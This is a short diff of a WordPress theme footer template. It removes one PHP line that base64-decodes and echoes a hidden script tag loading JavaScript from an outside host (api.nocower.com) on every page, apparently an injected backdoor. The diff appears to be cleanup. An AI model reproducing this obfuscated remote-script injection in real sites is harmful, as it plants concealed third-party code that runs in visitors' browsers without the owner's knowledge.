@@ -23,7 +23,6 @@ Copyright © <?php bloginfo('name'); ?> ™ |  <a href="<?php bloginfo('home'); 
 <div id="gotop" >
 </div>
 </a>
-<?php $str = 'PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cDovL2FwaS5ub2Nvd2VyLmNvbS9tZXRyby10aGVtZS11cGRhdGUvbWV0cm8uanMiPjwvc2NyaXB0Pg==';echo base64_decode($str);?>
 <?php
 if( is_single() ){?>
 <script type="text/javascript">
